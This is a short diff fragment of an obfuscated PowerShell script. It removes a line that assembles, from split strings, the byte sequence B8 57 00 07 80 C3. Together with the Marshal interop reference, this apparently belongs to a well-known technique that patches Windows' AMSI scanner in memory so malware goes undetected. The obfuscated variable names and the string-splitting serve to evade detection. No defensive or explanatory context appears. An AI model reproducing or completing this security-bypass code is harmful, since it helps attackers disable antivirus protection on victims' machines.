@@ -1,4 +1,4 @@
-$acyyr = [Byte[]] ("0"+"x"+"B"+"8","0"+"x"+"5"+"7","0"+"x"+"0"+"0","0"+"x"+"0"+"7",+"0"+"x"+"8"+"0",+"0"+"x"+"C"+"3")
+
 $p = 0
 $7amada = [System.Runtime.InteropServices.Marshal]
 $ahh = @"
